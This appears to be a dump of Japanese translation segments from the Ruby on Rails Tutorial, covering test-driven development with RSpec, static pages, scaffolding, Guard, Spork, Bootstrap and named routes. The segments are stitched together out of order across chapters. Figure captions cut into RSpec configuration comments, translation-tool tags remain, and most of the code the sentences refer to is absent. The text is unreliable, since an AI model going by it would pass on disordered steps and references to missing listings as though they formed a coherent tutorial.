テストにパスするHomeページ用コード。
トップレベルの見出し (\kode{<h1>}) が\kode{Sample App}に変更されたため、上のコードはテストにパスします。
また、\emph{アンカー}タグ \kode{a} を使って、指定したURLにジャンプする以下のリンクを追加しました (ちなみにアンカータグ内の “href” は “hypertext reference” と読みます)。
結果を見るために、もう一度テストを実行してみましょう。
Helpページについても、Homeページの例を参考にして、同じようなテストとアプリケーションコードを使用できることが推測できます。
Helpページの内容をテストするコードを追加する。
上のコードでテストを実行してみます。
テストのうち、1つは失敗するはずです。
(注: 執筆作業軽減のため、今後はRSpecの出力結果を掲載しません。画面表示の内容はシステムによって大きく異なるうえ、各段階での出力画面数を把握してメンテナンスし続けるのが極めて困難なためです。ご了承ください。)
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
テストにパスする、Helpページ用のコード。
これでテストにパスするはずです。
段階ごとにテストを作成してRSpecを実行することで、テスト駆動開発によってアプリケーション開発を進める方法を理解できるようになるでしょう。
赤色から緑色にするために、最初にAboutページ用の失敗するテストを書き、赤色にしましょう。
 Aboutページのテストを追加する。
今回の場合、 Aboutページを使用できるようにするには、\kode{about}アクションをStaticPagesコントローラの中に追加する必要があります。
最初に失敗するテストを書き、次にそのテストにパスするように実装することで、正常に動作するAboutページを作成できたという実感を得ることができます。
先ほど実装したRSpecのテストを実行します。
上を実行した出力結果の中に、以下のような警告が含まれているはずです。
No route matches [GET] "/static_pages/about"
selfを省略した結果をリスト\ref{code:about_route}に示します。
再び以下を実行します。
今度は以下のエラーメッセージが発生します。
\kode{about}アクションが追加されたStaticPagesコントローラ。
今度は、ビューなどの "テンプレート" が見当たらないというエラーメッセージが表示されます。
これは、\kode{about}ビューを追加することで解決します。
これはリスト\ref{code:about_view}で使用されていました。
  is a project to make a book and screencasts to teach web development
  is the sample application for the tutorial.
今度は、RSpecを実行すると緑色になるはずです。
テストが緑色になったので、安心してコードをリファクタリングできるようになりました。
多くの場合、コードを書き進めるうちに肥大化したり繰り返しが増えたりして、いつしか「悪臭を放つ」醜悪なコードになりはてるものです。
コンピュータはコードが醜くても気にしませんが、開発者にとってはそうはいきません。だからこそ、頻繁にリファクタリングを実施し、コードを清潔な状態に保ち続けることが重要です。
この点において、良いテストコードがあるということは非常に貴重です。リファクタリングする際にバグが混入する可能性を劇的に小さくしてくれるからです。
以上で、静的ページのアクションとビューを作成しました。次は、ページの内容を反映したタイトルを持ち、ページごとに内容が変化する、\emph{少しだけ}動的なページを作成してみましょう。
titleタグは、ほとんどのブラウザでウィンドウの上に表示されます (Google Chromeは例外ですが)。titleタグは、検索エンジン最適化 (SEO) においても重要な役割を担っています。
最初にタイトルのテストを作成し、次にタイトルを追加し、最後に\emph{レイアウト}ファイルを使ってリファクタリングと重複の排除を行います。
レイアウトファイルは、\kode{rails new}コマンドを実行していれば既に作成されているはずです。
レイアウトファイルの役割についてはこの後説明しますが、まずは作業開始前にレイアウトファイルのファイル名を変更しておきましょう。
(\kode{mv}はUnixのコマンドです。Windowsでファイル名を変更するには、ファイルブラウザから行うか、\kode{rename}コマンドを使ってください)。
これはリスト\ref{code:title_test}で使用されていました。
タイトルのテスト。
このテストでは\kode{have_title}メソッドを使っています。これは与えられたコンテンツにHTML要素 (タイトル) があるかどうかをチェックします。
つまり、以下のコードは、
\kode{title}タグの内容が以下のとおりになっていることを確認します。
ここで注意していただきたいのは、与えられた内容に対して完全一致する文字列を使用しなくてはならないということではなく、以下のように部分文字列を指定するだけでもよいということです。
上のコードでもタイトル全体とマッチします。
タイトルのテストを含むStaticPagesコントローラのspecファイル。
今度はテストが赤色 (テストが失敗する) になるはずです。
今度は、タイトルのテストがパスするようにし、それと同時にWebページを正しく表示させるためのHTMLをすべて追加しましょう。
現代的なWebページのマークアップは、基本的に以下のようになっています。
極めてシンプルなdoctype宣言である\kode{<!DOCTYPE html>}は、最新の標準HTML (HTML5) であることを示しています。
従って、Homeページのテストはパスするはずです。
緑 (Green)
このコードはリスト\ref{code:help_view_full_html}で使用されていました。もうひとつ、
      is a project to make a book and screencasts to teach web development
  is the sample application for the tutorial.
このようなコードの重複は、「重複してはならない」(Don’t Repeat Yourself, DRY) という重要な原則に反しています。以後、この節と次の節では重複を取り除き、コードをDRYにしていきます。
重複を取り除くテクニックの一つとして、ビューで\emph{埋め込みRuby} (Embedded Ruby) を使用できます。
タイトルにRubyを埋め込んだHomeページのビュー
タイトルで埋め込みRubyを使用したHelpページのビュー
タイトルで埋め込みRubyを使用したAboutページのビュー
これを見ると、唯一の例外である\emph{body}タグの内容を除き、\kode{すべて}のページで (titleタグの内容を含め) 同じ構造になっていることがわかります。
このレイアウトファイルを有効にするには、デフォルトのタイトル部分を以下の埋め込みRubyのコードに差し替えます。
この章では、Railsの強力な機能をいくつか紹介するためのデモアプリケーションを作成します。
\emph{scaffold}ジェネレータというスクリプトを使ってアプリケーションをすばやく生成する事により、 高度なRailsプログラミングとWebプログラミングの概要を学びます。
最後に、このリファクタリングが正常に行われたことを確認するために、リファクタリング前と同様にテストにパスすることを確認します。
生成されたRailsアプリケーションはブラウザのアドレスバーにURLを入力すれば動かすことができるので、これによりRailsアプリの構造、そしてRailsで推奨されている\emph{RESTアーキテクチャ}に関する洞察を得ることにします。
後に作成するサンプルアプリケーションと同様、デモアプリケーションは、\emph{ユーザー}と、それに関連している\emph{マイクロポスト}から成り立っています。
次の章に進む前に、差分をコミットしてマスターブランチにマージしておきましょう。
はじめに、デモアプリケーションをどのようなものにするのか、計画を立てましょう。
デモアプリケーション用の\kode{Gemfile}。
好みに応じて、更新したアプリケーションをHerokuに展開しても構いません。
(第1章でも書きましたが、Bundlerで\texttt{readline}エラーが発生した場合は、\kode{Gemfile}に\kode{gem ’rb-readline’}を追加してください)。
最後に、このデモアプリケーションをバージョン管理下に置きます。
リスト\ref{code:gitignore}のとき
Gitリポジトリを初期化して最初のコミットを実行しておきます。
{0}図2.1{/0}{1}GitHubでデモアプリ用リポジトリを作成する。\href{http://railstutorial.org/images/figures/create_demo_repo_4_0-full.png}{(拡大)}{/1}
基本となるタイトルを含むStaticPagesコントローラのspec。
(最初のアプリケーションのときと同様、GitHubリポジトリを初期化するときに\emph{README}を使用\kode{しない}ように注意してください。)
今回のデモアプリケーションでは、ユーザーと短いマイクロポストのみをサポートするマイクロブログを作成します。
各ユーザーには、重複のない一意のキーとなる\kode{integer}型のID番号 (\kode{id}と呼びます) を割り当て、このIDに加えて一般公開される\kode{string}型の名前 (\kode{name})、そして同じく\kode{string}型のメールアドレス (\kode{email}) を持たせます。メールアドレスはユーザー名としても使われます。
SQLiteの代わりにPostgreSQLを使う場合の\kode{Gemfile}。
マイクロポストのデータモデルはユーザー用のデータモデルよりもさらにシンプルです。\kode{id}と、マイクロポストのテキスト内容を格納する\kode{string}型の\kode{content}だけで構成されています
最後に、Sublime Text上で直接テストを実行する方法を紹介します。このテクニックは、特にSporkと併用すると非常に便利です。
もっと多い文字数の投稿できるモデルにしたい場合は (たとえば、マイクロポストではなく、ブログのような投稿を許可したい場合は)、\kode{string}の代わりに\kode{text}を使うとよいでしょう。
この節は、ほとんどが上級者向けの内容になっており、この節を飛ばしても次の章以降には何の影響もありません。
しかし実際には、マイクロポストをユーザーと\emph{関連付ける (associate)} 必要があるため、ポストのオーナーを記録するための\kode{user_id}も追加します。
この節の内容は先進的ですが、その分、本書の他の内容よりも陳腐化しやすいので、ご利用のシステムでこの節の例が完全に動作するとは限りません。この点をご了承願います。完全に動作させるには、Googleで最新情報を検索して調べることが必要になるでしょう。
(技術的な理由により、\kode{rails}コマンドだけは例外です)。
この節の作業はかなり厄介です。また、bundle execの入力を省略する方法を2とおりの方法で説明します。
RVM Bundler の統合
最初に、お勧めの方法としてRVMを使う方法を紹介します。RVMはバージョン1.11以降からBundlerとの統合が含まれています。
最初に、以下に従ってRVMのバージョンを最新にします。
バージョン1.11.x以降のRVMを使用していれば、インストールされたgemは自動的に適切なBundlerの環境で実行されますので、それ以上何もしなくても以下のようにbundle execを省略してで実行できます。
\kode{bundle exec}を省略することができました。
このとおりにできた場合は、この節の残りはスキップしてください。
一見奇妙ですが、実行方法は簡単です。
最初に以下の2つのコマンドを実行します。
次に以下のコマンドを実行します。
      create    db/migrate/20130305221714_create_users.rb
魔法のように見えますが、これらのコマンドでRVMとBundlerを統合できます。そして、\kode{rake}や\kode{rspec}などのコマンドを適切な環境で自動的に実行してくれます。
\kode{.gitignore}ファイルに\kode{bundler_stubs}を追加する。
      invoke  jbuilder_scaffold_controller
bundler_stubs/
同様に\kode{rake}なども以下のように実行できます。
本書の以後の章では、この節をスキップする方に配慮して明示的に\kode{bundle exec}を与えてコマンドを実行するようにしています。もちろん、ご利用のシステムが適切に設定されていれば、bundle execを省略しても構いません。
binstubsオプション
\kode{rspec}コマンドは、テストのたびにコマンドラインに移動して手動でコマンドを実行しなければならない点が面倒です
この節では、テストを自動化する\href{https://github.com/guard/guard}{Guard}というgemの使い方を紹介します。
Guardはファイルシステムの変更を監視し、たとえば\kode{static_pages_spec.rb}ファイルを変更すると自動的にテストを実行します。
さらに、\kode{home.html.erb}ファイルが変更されると \kode{static_pages_spec.rb}が自動的に実行されるようにGuardを設定することもできます。
サンプルアプリケーションの\kode{Gemfile}にGuardを追加する。
# Uncomment this line on OS X.
       exist      app/views/users
# gem 'growl', '1.0.3'
# Uncomment these lines on Linux.
# gem 'libnotify', '0.8.0'
# Uncomment these lines on Windows.
# gem 'rb-notifu', '0.0.4'
上のコードを使用する際は、testグループ内で自分のシステムに該当する行を必ずコメント解除してください
(Mac用のGrowlの通知機能を使用するのであれば、\href{http://growl.info/downloads}{Growl}をAppleのApp Storeで購入する必要があります。値段は大したことはありません)。
次に\kode{bundle install}を実行してgemをインストールします。
Guardを初期化し、RSpecと一緒に動作するようにします。
Writing new Guardfile to /Users/mhartl/rails_projects/sample_app/Guardfile
rspec guard added to Guardfile, feel free to edit it
デフォルトの\kode{Guardfile}に追記する。
\kode{require}が追加されていることに注意。
# Custom Rails Tutorial specs
"spec/requests/authentication_pages_spec.rb"
ここまで実行すれば、以下のように\kode{rails s}コマンド (\kode{rails server}コマンドの短縮版) を実行してローカルWebサーバーを起動できるようになります。
これは、テストのパスに失敗した後に、他の余分なテストが実行されないようにするためのものです (Red-Green-Refactorのサイクルを早めるため)。
これで\href{http://localhost:3000/}{http://localhost:3000/}でデモアプリケーションをブラウザ表示できるようになっているはずです。
以上の準備が終われば、以下のコマンドで\kode{guard}を起動できます。
\kode{spec/routing}ディレクトリが見つからないというエラーが表示された場合は、以下のように空のディレクトリを作ることで回避できます。
\kode{bundle exec rspec}を実行すると、テストが開始されるまでしばらく時間がかかることにお気付きかもしれません。テストがいったん開始されればすぐに終了します。
これは、RSpecを実行するたびにRailsの環境全体を読み込み直す必要があるためです。
\emph{spork}はspoon-forkを組み合わせた造語です。
このプロジェクト名は、\href{http://en.wikipedia.org/wiki/POSIX}{POSIX}の\href{http://en.wikipedia.org/wiki/Fork_(software_development)}{fork}におけるSporkの用法をもじったものです。
Sporkは環境を\emph{1回だけ}読み込み、今後実行するテストのためのプロセスを管理します。
サンプルアプリケーションの\kode{Gemfile}にSporkを追加する。
次に、\kode{bundle install}でSporkをインストールします。
次に、Sporkの設定にbootstrapを指定します。
\kode{Spork.prefork}ブロックへの環境読み込みを追加する。
# Requires supporting ruby files with custom matchers and macros, etc,
# in spec/support/ and its subdirectories.
# Checks for pending migrations before tests are run.
# If you are not using ActiveRecord, you can remove this line.
# == Mock Framework
# If you prefer to use mocha, flexmock or RR, # uncomment the appropriate line:
# config.mock_with :mocha
{0}図2.4{/0}{1}Usersリソース (\href{http://localhost:3000/users}{/users}) ページの最初の状態。\href{http://railstutorial.org/images/figures/demo_blank_user_index_rails_3-full.png}{(拡大)}{/1}
# config.mock_with :flexmock
# config.mock_with :rr
# Remove this line if you're not using ActiveRecord<n>    # or ActiveRecord fixtures
{0}図2.5{/0}{1}新規ユーザー作成ページ (\href{http://localhost:3000/users/new}{/users/new})。\href{http://railstutorial.org/images/figures/demo_new_user_rails_3-full.png}{(拡大)}{/1}
# If you're not using ActiveRecord, or you'd prefer not to run each of
# your examples within a transaction, remove the following line or
# assign false instead of true.
# If true, the base class of anonymous controllers will be inferred
# automatically.
This will be the default behavior in future versions of
{0}図2.6{/0}{1}ユーザー表示用のページ (\href{http://localhost:3000/users/1}{/users/1})。\href{http://railstutorial.org/images/figures/demo_show_user_rails_3-full.png}{(拡大)}{/1}
# rspec-rails.
# Run specs in random order to surface order dependencies.
If you
{0}図2.7{/0}{1}ユーザー編集用のページ (\href{http://localhost:3000/users/1/edit}{/users/1/edit})。\href{http://railstutorial.org/images/figures/demo_edit_user_rails_3-full.png}{(拡大)}{/1}
# find an order dependency and want to debug it, you can fix the
{0}図2.8{/0}{1}情報が更新されたユーザー。\href{http://railstutorial.org/images/figures/demo_update_user_rails_3-full.png}{(拡大)}{/1}
# order by providing the seed, which is printed after each run.
#     --seed 1234
{0}図2.9{/0}{1}2人目のユーザーが追加された一覧ページ (\href{http://localhost:3000/users}{/users})。\href{http://railstutorial.org/images/figures/demo_user_index_two_rails_3-full.png}{(拡大)}{/1}
# This code will be run each time you run your specs.
ユーザーの作成、表示、編集方法について説明しましたので、今度はユーザーを削除してみましょう ({0}{1}図2.10{/1}{/0})。
Sporkを起動する前に、以下のようにテストスイートを実行して、基準となる実行時間を測定します。
{0}{1}図2.10{/1}{/0}の [Destroy] リンクをクリックするとユーザーが削除され、indexページのユーザーは1人だけになります
6 examples, 0 failures
real	0m8.633s
なお、\ref{sec:destroying_users}ではサンプルアプリケーションにユーザーを削除する機能を実装し、管理権限 (admin) を持つユーザー以外は削除を実行できないように制限をかけます。
user	0m7.240s
{0}図2.10{/0}{1}ユーザーを削除する。\href{http://railstutorial.org/images/figures/demo_destroy_user_rails_3-full.png}{(拡大)}{/1}
sys	0m1.068s
上の実行結果では、実際のテストは1/10秒以下で実行されますが、テストスイートは7秒以上かかっています。
実行時間のスピードアップのため、別のターミナルウィンドウを開いてアプリケーションのルートディレクトリに移動し、以下のようにSporkサーバーを起動します。
{0}図2.11{/0}{1}RailsにおけるMVC。\href{http://railstutorial.org/images/figures/mvc_detailed-full.png}{(拡大)}{/1}
Using RSpec
Loading Spork.prefork block...
Spork is ready and listening on 8989!
real	0m2.649s
user	0m1.259s
sys	0m0.258s
selfを省略した結果をリスト\ref{code:rspec_drb}に示します。
自動的にSporkを使うためのRSpecの設定。
Sporkを使う上でひとつ注意があります。preforkで読み込むファイル (たとえば\kode{routes.rb}) が変更された場合、Sporkサーバーを再起動して新しいRailsの環境を再度読み込む必要があります。
パスするはずのテストが失敗した場合は、\texttt{Ctrl-C}でSporkサーバーを停止して再起動してください。
\kode{class UsersController < ApplicationController}という記法は、Rubyの\emph{クラス}での\emph{継承}の使用例となっていることにも注目してください
GuardにSporkを導入する
SporkはGuardと併用すると非常に便利です。設定を行うと、以下のようにコマンド上で併用することができます。
これはリスト\ref{code:spork_guardfile}で使用されていました。
Spork向けに更新した\kode{Guardfile}。
設定が完了したら、以下の\kode{guard}コマンドでGuardとSporkを同時に起動します。
Guardは自動的にSporkサーバーを起動するため、テスト実行時のオーバヘッドを劇的に削減できます。
Guard、Spork、テスト通知機能 (オプション) を使用して便利なテスト環境を構築することで、テスト駆動開発がやみつきになることでしょう。
Sublime Textを使用していれば、エディタの中から直接テストを実行できる強力なヘルパーコマンドを利用できます。
このテスト方法は著者のお気に入りです。最終的に大規模にスケールアップする可能性のある少数のテストを、長期間に渡って実施したいような場合に非常に有用であるためです。
参考: \href{https://github.com/mhartl/rails_tutorial_sublime_text}{Rails Tutorial Sublime Text}{p1}にある説明に従って設定することもできます。
Sublime Textを再起動すると、以下のようなコマンドがRubyTestパッケージによって提供されます。
比較的小さいプロジェクトであってもテストスイートの実行には時間がかかるため、テストを一度に1つだけ実行したり、小規模なテストグループだけを実行したりできるのは大きな長所です。
従来のテストでは、たった１つのテストを実行するだけでも、Railsの環境に匹敵するオーバーヘッドが発生してしまいました。このため、上述のテスト用コマンドとSporkの組み合わせは非常に相性が良いのです。Sporkは、テストを実行するたびに発生していたテスト環境起動によるオーバーヘッドを取り除いてくれるため、1つのテストを実行するたびにすべてをテストするのと同程度のオーバーヘッドが発生するようなことがなくなります。
個人的には、以下のテスト手順がお勧めです。
ターミナルウィンドウでSporkを起動する。
テストを1つ (または小規模なテストグループ) を作成する。
Command-Shift-Rコマンドでテストが失敗することを確認する。
対応するアプリケーションコードを作成する。
Command-Shift-Eコマンドで上のテストと同じテストを実行し、今度は成功することを確認する。
2-5の手順を繰り返す。
中継点 (コミットの直前など) に到達したら、 コマンドラインで\kode{rspec spec/}を実行してテストスイートをすべて実行し、成功することを確認する。
Sublime Textの中からテストが実行できることはもちろん便利ですが、場合によってはGuardの方が便利なこともあると思います。上の手順は、著者が個人的に常用しているテスト駆動開発のテクニックとしてご紹介しました。
通常、これらのアクションは、ページを出力せずにデータベース上のユーザー情報を操作します (もちろん、ページを出力しても良いのですが)。
HTTP requestメソッドの詳細については\ref{sec:TDD}で説明します。
REST理論そのものはかなり抽象的ですが、RailsアプリケーションにおけるRESTとは、アプリケーションを構成するコンポーネント (ユーザーやマイクロポストなど) を「\emph{リソース}」としてモデル化することを指します。これらのリソースは、リレーショナルデータベースの\href{http://en.wikipedia.org/wiki/Create,_read,_update_and_delete}{作成/読み取り/更新/削除 (Create/Read/Update/Delete: CRUD) 操作}と、4つの基本的な\href{http://en.wikipedia.org/wiki/HTTP_request#Request_methods}{HTTP requestメソッド} (\texttt{POST}/\texttt{GET}/\texttt{PUT}/\texttt{DELETE}) の両方に対応しています
デモアプリケーションのユーザー\kode{index}アクションを整理したもの。
\kode{index}アクションに\kode{@users = User.all}という行があります (図2.11 の③に相当)。これによって、Userモデルからすべてのユーザーの一覧を取り出し (④)、\kode{@users}という変数に保存します (⑤)。なお、@usersは「あっと ゆーざーず」と発音します。
デモアプリケーションのUserモデル。
厳密にはこれは正しい表現ではありません。というのも、scaffoldのコードには初歩的なテストが一応含まれているからです。ただ、scaffoldのテストコードは読みづらく、柔軟性もありません。さらにデータの検証、ユーザー認証、その他に必要な独自テストも含まれていません。
RailsのRESTful構造を身体に叩きこむには、繰り返し学ぶのが一番です。UsersリソースとMicropostsリソースの構造の類似点を理解することが、この章の主要な目的です
$ rails generate scaffold Micropost content:string user_id:integer
      create    db/migrate/20130307005528_create_microposts.rb
       exist      app/views/microposts
\href{http://localhost:3000/microposts/new}{/microposts/new}ページをブラウザで開き、新しいマイクロポストの情報を入力してマイクロポストをいくつか作成してみましょう ({1}{2}図2.12{/2}{/1})。
{0}図2.12{/0}{1}新しいマイクロポストの作成ページ (\href{http://localhost:3000/microposts/new}{/microposts/new})。\href{http://railstutorial.org/images/figures/demo_new_micropost-full.png}{(拡大)}{/1}
結果は{0}{1}図2.13{/1}{/0}のようになるはずです。
{0}図2.13{/0}{1}マイクロポストのindexページ (\href{http://localhost:3000/microposts}{/microposts})。\href{http://railstutorial.org/images/figures/demo_micropost_index_rails_3-full.png}{(拡大)}{/1}
{0}{1}図2.14{/1}{/0}に示したとおり、マイクロポストの内容が長すぎるという\emph{エラーメッセージ}がRailsによって表示されます
{0}図2.14{/0}{1}マイクロポストの作成に失敗した場合のエラーメッセージ。\href{http://railstutorial.org/images/figures/micropost_length_error_rails_3-full.png}{(拡大)}{/1}
"2013-03-06 02:37:37", updated_at: "2013-03-06 02:37:37">, #<Micropost id: 2,
(最後の行のようにexitを実行するとrails consoleを終了できます。多くのシステムでは、Ctrl-dキーを押して終了することもできます。)
\kode{first_user.microposts}というコードを実行すると、そのユーザーに関連付けられているマイクロポストにアクセスできます。このときActive Recordは、\kode{user_id}が\kode{first_user}のid (ここでは\kode{1}) と等しいマイクロポストを自動的に返します。
最後に、デモアプリケーションで使用しているRailsのコントローラとモデルのクラス階層について簡単に解説します。
\kode{User}クラスにおける継承。
\kode{Micropost}クラスにおける継承。
{0}{1}リスト2.17{/1}{/0}を見ると、\kode{ApplicationController}自身は\kode{ActionController::Base}を継承しています。これはRailsのAction Packというライブラリが提供している、コントローラ用のベースクラスです。
\kode{UsersController}クラスにおける継承。
\kode{MicropostsController}クラスにおける継承。
\kode{ApplicationController}クラスにおける継承。
モデルの継承関係と同様に、UsersコントローラもMicropostsコントローラも最終的には\kode{ActionController::Base}を継承しており、モデルオブジェクトの操作、インバウンドHTTP requestのフィルタ、ビューをHTMLとして出力するなどの多彩な機能を実行できるようになっています。
Micropostsリソースの説明が終わりましたので、ここでリポジトリをGitHubに登録しましょう。
このコマンドを実行すると、先ほど定義したユーザーとマイクロポストのデータモデルを使って、Heroku上のデータベースが更新されます。
ついにRailsアプリケーションを最後まで完成させました。
この章で作成したデモアプリケーションには良いところもありますが、さまざまな弱点もあります。
“Home” や “About” のような静的なページがない
サインインできない
テスト駆動開発が行われていない
この章では、アプリケーションに\emph{Bootstrap}フレームワークを組み込み、そして、カスタムスタイルを追加します
\emph{Railsチュートリアル}はWeb開発のための本であり、Webデザインの本ではありませんが、だからといって\emph{何のスタイルもない}寒々しい外観のアプリケーションでいつまでも作業を続けていると憂鬱になってしまいます。そこで、この章ではレイアウトにいくつかの構造とCSSを与えて最小限のスタイルを追加します。カスタムCSSルールの他に、Twitter社によるオープンソースのWebデザインフレームワークである\href{http://getbootstrap.com/}{Bootstrap}を利用します。
\kode{header}タグの内側には2つの\kode{div}タグがあります。
この場合、それぞれの\kode{div}にはCSSクラスが与えられています。
\kode{header}タグのクラスと同様に、これらのクラスもBootstrapにおいて特別な意味を持っています。
divに続いて、埋め込みRubyコードが出現します。
正式にはここでは不要ですが、\kode{nav}タグはその内側がナビゲーションリンクであるという意図を伝える役割があります。
\kode{ul}タグの\kode{nav}と\kode{pull-right}クラスは、Bootstrapにおいて特別な意味を持ちます。
Railsがこのレイアウトを処理し、埋め込みRubyを評価すると、上のリストは以下に置き換わります。
\ref{sec:layouts}で学んだように、\kode{yield}メソッドはWebサイトのレイアウトにページごとの内容を挿入します。
今後登場するスタイル要素を利用できるようにするために、\kode{home.html.erb}ビューに特別な要素をいくつか追加します(リスト\ref{code:signup_button})。
(\kode{mkdir}コマンドやGUIベースのファイルマネージャを使用してこのディレクトリを作成する必要があることもあります)。
Asset PipelineでLESSを使うこともできます。詳細は\href{http://rubygems.org/gems/less-rails-bootstrap}{\texttt{less-rails-bootstrap} gem}を参照してください。
次に、開発中のアプリケーションに変更を反映するために、Webサーバーを再起動します
(ほとんどのシステムでは、最初に\texttt{Ctrl-C}を押下してサーバーを停止し、次に\kode{rails server}コマンドを実行することでサーバーを再起動できます)。
アプリケーションにカスタムCSSを追加するための第一段階として、カスタムCSSを格納するための以下のファイルを開きます。
app/assets/stylesheets
selfを省略した結果をリスト\ref{code:bootstrap_css}に示します。
(場合によっては、\texttt{Ctrl-C}を使用してローカルのWebサーバーを再起動する必要があるかもしれません。
また、スクリーンショットではBootstrap 2.0を使用していますが、このチュートリアルではBootstrap 2.3を使用しているので、外観に多少の違いが生じる可能性があることをご了承ください。
これらについて心配する必要はありません。)
(デフォルトのnavbarの色は、Bootstrap 2.0から2.1に変わったときに変更されたため、現在の淡色の代わりにダークな色調にしたい場合は\kode{navbar-inverse}クラスを使用する必要があります)。
これはリスト\ref{code:stylesheets_partial}で使用されていました。
これらのディレクトリ中のファイルは、http://example.com/stylesheetsのようなリクエストによって自動的に配信されます。これは3.0以降も同様です。
Rails 3.1以降では、静的ファイルを目的別に分類する、標準的な\emph{3つの}ディレクトリが使用されるようになりました。Rails 4.0でも同様です。
images      javascripts stylesheets
\href{http://ruby.railstutorial.org/ruby-on-rails-tutorial-book}{\emph{Ruby on Railsチュートリアル}}へようこそ。
\ref{sec:embedded_ruby}では最初にERbを、\ref{sec:sass}ではSassをそれぞれ扱いました。
小さなスタートアップから巨大企業まで、多くの組織が Rails を使っています。例えば、\href{http://37signals.com/}{37signals} や \href{http://github.com/}{GitHub}、\href{http://shopify.com/}{Shopify}、\href{http://scribd.com/}{Scribd}、\href{http://twitter.com/}{Twitter}、\href{http://disney.com/}{Disney}、\href{http://hulu.com/}{Hulu}、\href{http://yellowpages.com/}{Yellow Pages} など、\href{http://rubyonrails.org/applications}{Ruby on Rails を使っているサイトのリスト}は増える一方です。
実際、Bootstrapフレームワークでは、多くの色に対して変数名を定義しています。定義されている変数はBootstrapページの「\href{http://bootstrapdocs.com/v2.0.4/docs/less.html}{LESS変数一覧}」で参照することができます。
このWebサイトでは、SassではなくLESSを使って変数が定義されていますが、\texttt{bootstrap-sass}というgemを使用すれば、Sassでも同様の変数が使えるようになります。
\href{http://peepcode.com/}{PeepCode}: 質の高い商用のスクリーンキャスト
\href{http://www.codeschool.com/}{Code School}: プログラミングを対話的に学習できるコース
しかし、上の記法はRails流ではありません。
\href{http://railscasts.com/}{RailsCasts} (Ryan Bates): さっきも \href{http://railscasts.com/}{RailsCasts} を紹介しましたっけ？
そのぐらい \href{http://railscasts.com/}{\emph{RailsCasts}} はお勧めです。
Contactページのテストをリスト\ref{code:contact_page_test}に示します。これは単にリスト\ref{code:pages_controller_spec_title}で使用されているテストのパターンに従ったものです。
Contactページのテスト。
URLに対するテストができあがったので、それらを実際に利用できるようにしましょう。
デフォルトのルートファイルの内容を見てみると、かなり乱雑になっています。しかし、それらはすべてコメントアウトされたルートマッピングの例であり、必要な乱雑さです。
時間のあるときにこのルートマッピングを読んでみることをお勧めします。また、より詳細なルーティングの扱いについてはRails Guidesの「\href{http://guides.rubyonrails.org/routing.html}{Railsにおける外部から内部へのルーティング} (英語)」を参照することをお勧めします。
名前付きルートを定義するため、以下のようなルールを置き換えます。
このルーティングは、\kode{/help} (\texttt{GET}リクエストに応答する) で有効なページと、そのページへのパスを返す\kode{help_path}という名前の名前付きルートの両方を準備します
(実際には、\kode{match}の箇所に\kode{get}を使用しても同じ名前付きルートになりますが、\kode{match}を利用する方がよりRailsの慣例に従っています)。
これはリスト\ref{code:root_route}で使用されていました。
変更前の以下のコードは、より明示的でした。
このコードも同じページへたどり着きますが、\kode{/about}の方が簡潔です。
さらに前述したように、\kode{match ’/about’}というコードは自動的にコントローラとビューで使用する\emph{名前付きルート}を生成します。
なお、\emph{Railsチュートリアル}では、\kode{path}書式を使用する一般的な規約に従い、リダイレクトの場合のみ\kode{url}書式を使用します。
これは、HTTP標準では技術的にリダイレクト後にフルURLが要求されるためです。ただし、ほとんどのブラウザではどちらの方法でも動作します。
RubyGemsがインストールされていない場合は、\href{http://rubyforge.org/frs/?group_id=126}{RubyGemsをダウンロード}して解凍し、作成された\kode{rubygems}ディレクトリでセットアッププログラムを実行してください。
ルーティングが定義されたので、Help、About、Contactページのテストはパスするはずです。
これで、失敗するテストはHomeページを残すだけとなりました。
Homeページへのルートマッピングを作成する際に、以下のようなコードを使用\emph{することも一応可能です}。
ルート (root) へのルーティングを定義する、コメント内のヒント。
特定のバージョンのRailsインストーラへのリンクを作成してもらえるよう、現在Engine Yardに働きかけています。
また、URLヘルパーに以下の設定を与えます。
これで静的ページへのルートがすべて動作し、テストもすべてパスするはずです。
後は、レイアウトのリンクをこれらの名前付きルートで埋めればよいのです。
そのためには、\kode{link_to}メソッドの2番目の引数に適切な名前付きルートを指定する必要があります。
ところで、実際にレイアウト上にリンクが存在するかどうかをまだテストしていませんが、テスト方法のヒントとして、「名前付きルートが定義されていなければテストは失敗する」ということに注目してください。
このコードはリスト\ref{code:static_page_routes}で使用されていました。もうひとつ、
{0}図5.8{/0} {1}\href{http://localhost:3000/about}{/about}で表示されるAboutページ{/1}
\href{http://rack.rubyforge.org/doc/}{Rackミドルウェア}用の設定ファイル
       route  get "users/new"
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
サインアップページへのテストを含む最初のusers用spec。
いつもと同様、これらのテストを以下のように\kode{rspec}コマンドで実行できます。
上のように特定のファイルを1つ渡す代わりに、以下のようにrequestsディレクトリ全体を渡すと、すべてのリクエストspecのテストを実行できることを覚えておくと良いでしょう。
上のパターンから、それ以外のディレクトリを含む\emph{すべて}のspecを実行する以下の方法も容易に想像がつくと思います。
完全を期して、今後はチュートリアルの最後まで基本的に上の方法を使用してテストをフル実行します。
なお、Rakeタスクで\kode{spec}のテストスイートを実行できることも覚えておくとよいでしょう (他の開発者が使っているのを見たことがあるかもしれません)。
(実際には\kode{rake}とタイプするだけで済みます。\kode{rake}のデフォルトの動作はテストスイートの実行です)。
Usersコントローラは、作成時に既に\kode{new}アクションを持っているため、後はテストをパスさせるために正しいルートとビューの中身を作成すればよいのです。
これはリスト\ref{code:generate_users_controller}で使用されていました。
残っている作業は、Homeページのボタンに適切なリンクを追加することです。
これはリスト\ref{code:home_page_signup_link}で使用されていました。
Gitを使っている方は、この時点でmasterブランチに変更をマージしてください。
これで、本番環境のサーバーでサンプルアプリケーションが動作しているはずです。
{0}図5.1{/0}{1}サンプルアプリケーションのHomeページのモックアップ。\href{http://railstutorial.org/images/figures/home_page_mockup_bootstrap-full.png}{(拡大)}{/1}
しかしながら、道具の使い方を覚えることが職人にとって当然の心得であるように、使用するツールについて学ぶことは大切なことです。払った努力に見合う見返りは必ずあります。
{0}図1.2{/0}{1}新規作成されたRailsアプリケーションのディレクトリ構造。\href{http://railstutorial.org/images/figures/directory_structure_rails_4_0-full.png}{(拡大)}{/1}
{0}図5.2{/0}カスタムCSSを使用していない{1}Homeページ (\href{http://localhost:3000/static_pages/home}{/static_pages/home})。\href{http://railstutorial.org/images/figures/layout_no_logo_or_custom_css_bootstrap_rails_4-full.png}{(拡大)}{/1}
